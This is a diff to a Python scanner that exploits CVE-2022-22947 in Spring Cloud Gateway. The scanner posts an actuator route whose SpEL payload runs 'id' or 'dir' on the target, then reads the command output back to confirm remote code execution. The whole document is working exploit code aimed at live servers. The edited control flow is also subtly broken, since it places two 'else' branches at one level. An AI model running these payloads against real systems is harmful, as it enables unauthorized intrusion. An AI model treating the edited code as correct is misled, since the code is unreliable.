@@ -109,29 +109,20 @@ def CVE_2022_22947(url, proxies):
         'Content-Type': 'application/x-www-form-urlencoded'
     }
 
-    payload = '''{\r
+    payload_windows = '''{\r
               "id": "hacktest",\r
               "filters": [{\r
                 "name": "AddResponseHeader",\r
-                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream()))}"}\r
+                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"dir\\"}).getInputStream()))}"}\r
                 }],\r
               "uri": "http://example.com",\r
               "order": 0\r
             }'''
-
-    payload2 = '''{\r
-              "id": "hacktest",\r
-              "filters": [{\r
-                "name": "AddResponseHeader",\r
-                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"whoami\\"}).getInputStream()))}"}\r
-                }],\r
-              "uri": "http://example.com",\r
-              "order": 0\r
-            }'''
+    payload_linux = payload_windows.replace('dir', 'id')
 
     try:
         requests.packages.urllib3.disable_warnings()
-        re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json, timeout=10 ,verify=False, proxies=proxies)
+        re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload_linux, headers=headers1, json=json, timeout=10 ,verify=False, proxies=proxies)
         re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
         re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
         if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
@@ -139,10 +130,21 @@ def CVE_2022_22947(url, proxies):
             f2 = open("vulout.txt", "a")
             f2.write("[+] [CVE-2022-22947] " + url + '\n')
             f2.close()
+        else:
             re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
             re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+            re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload_windows, headers=headers1, json=json, timeout=10 ,verify=False, proxies=proxies)
+            re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+            re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=10 ,verify=False, proxies=proxies)
+            if ('<DIR>' in str(re3.text)):
+                cprint(f'[+] [CVE-2022-22947] {url}', "red")
+                f2 = open("vulout.txt", "a")
+                f2.write("[+] [CVE-2022-22947] " + url + '\n')
+                f2.close()
         else:
             cprint("[-] 目标 " + url + " 验证CVE-2022-22947漏洞不存在", "yellow")
+            re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout=5 ,verify=False, proxies=proxies)
+            re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=5 ,verify=False, proxies=proxies)
     except KeyboardInterrupt:
         print("Ctrl + C 手动终止了进程")
         sys.exit()
